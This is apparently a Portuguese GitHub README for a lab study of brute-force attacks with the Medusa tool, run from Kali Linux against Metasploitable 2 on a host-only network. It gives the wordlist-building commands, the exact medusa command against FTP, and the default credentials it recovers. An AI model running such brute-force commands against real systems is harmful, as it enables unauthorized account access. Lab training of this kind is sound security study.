# BruteForceWithMedusa
🔐 Cybersecurity – Brute Force Attack using Medusa

Este repositório contém um estudo prático sobre ataques de força bruta utilizando a ferramenta Medusa, executados em um ambiente seguro e controlado, composto por Kali Linux (máquina atacante) e Metasploitable 2 (máquina alvo).
O projeto demonstra todo o fluxo, desde a criação de wordlists personalizadas até a execução dos ataques em serviços vulneráveis como FTP (vsftpd) e HTTP (login DVWA).

📌 Objetivos do Projeto

1. Entender como ataques de força bruta funcionam na prática.

2. Identificar a importância de senhas fortes e políticas de autenticação.

3. Aprender a usar o Medusa, uma ferramenta rápida e modular de brute force.

4. Realizar ataques controlados contra serviços vulneráveis.

5. Capturar e analisar resultados dos ataques bem-sucedidos.

6. Praticar técnicas reais de segurança ofensiva em laboratório.

⚠️ Todos os testes foram realizados SOMENTE em ambiente controlado.
Não realize ataques sem autorização — isso é crime.

🛠️ Ferramentas Utilizadas
Ferramenta	Descrição
Kali Linux	Ambiente atacante
Metasploitable 2	Máquina vulnerável alvo
Medusa	Ferramenta usada para brute force
DVWA	Web app vulnerável para login brute force
vsftpd 2.3.4	FTP vulnerável do Metasploitable
Wordlists customizadas	Arquivos criados manualmente

Prints do ambiente estão presentes em:
📁 /screenshots


🚀 Passo a Passo Completo


1️⃣ Criação das Wordlists

echo -e "user\nmsfadmin\nadmin\root" > users.txt

Criado manualmente com usuários comuns do Metasploitable

echo -e "123456\nmsfadmin\npassword\nqwerty" > pass.txt

Contendo senhas fracas para teste

Essas listas foram usadas nos ataques do Medusa.

2️⃣ Configuração do Alvo

A máquina Metasploitable 2 foi configurada na rede host-only:

IP alvo: 192.168.56.101

Teste de conexão:

ping 192.168.56.101

3️⃣ Ataque Brute Force – FTP (vsftpd 2.3.4)
Comando usado:

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6

Resultado esperado:
[+] ACCOUNT FOUND: User: msfadmin Password: msfadmin


O serviço FTP do Metasploitable possui credenciais padrão extremamente fracas.

4️⃣ Acessando Serviço FTP 
comando usado:

ftp 192.168.56.101 

msfadmin
msfadmin

Resultado esperado: 230 Login successful.

